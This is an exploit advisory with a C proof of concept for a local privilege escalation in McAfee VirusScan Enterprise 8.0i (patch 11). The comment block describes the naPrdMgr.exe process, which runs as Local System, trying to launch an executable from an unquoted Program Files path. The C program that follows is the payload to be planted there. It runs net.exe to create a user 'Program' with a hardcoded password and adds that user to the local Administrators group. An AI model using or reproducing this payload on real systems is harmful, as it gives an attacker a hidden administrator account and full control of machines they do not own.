/*
Summary
McAfee VirusScan Enterprise - "Enterprise antivirus and antispyware solution. McAfee VirusScan detects, blocks, and removes viruses and spyware, that 
may result in the loss of your irreplaceable documents, such as digital photos, family movies, and financial spreadsheets, identity theft and slower 
PC performance."

A security vulnerability in McAfee's VirusScan Enterprise allows local attackers to escalate their privileges.


Details
Vulnerable Systems:
 * McAfee VirusScan Enterprise 8.0i (patch 11) and CMA 3.5 (patch 5)

Immune Systems:
 * McAfee VirusScan Enterprise 8.0i (patch 12)

By default the naPrdMgr.exe process runs under the context of the Local System account. Every so often it will run through a process where it does 
the following:
 - Attempts to run \Program Files\Network Associates\VirusScan\EntVUtil.EXE
 - Reads C:\Program Files\Common Files\Network Associates\Engine\SCAN.DAT
 - Reads C:\Program Files\Common Files\Network Associates\Engine\NAMES.DAT
 - Reads C:\Program Files\Common Files\Network Associates\Engine\CLEAN.DAT

*/ 


#include <windows.h>
#include <stdio.h>

INT main( VOID )
{
    CHAR szWinDir[ _MAX_PATH ];
    CHAR szCmdLine[ _MAX_PATH ];
    GetEnvironmentVariable( "WINDIR", szWinDir, _MAX_PATH );
    printf( "Creating user \"Program\" with password \"p@55w0rd\"...\n" );
    wsprintf( szCmdLine, "%s\\system32\\net.exe user Program p@55w0rd /add", szWinDir );
    system( szCmdLine );
    printf( "Adding user \"Program\" to the local Administrators group...\n" );
    wsprintf( szCmdLine, "%s\\system32\\net.exe localgroup Administrators Program /add", szWinDir );
    system( szCmdLine );
    return 0;
}

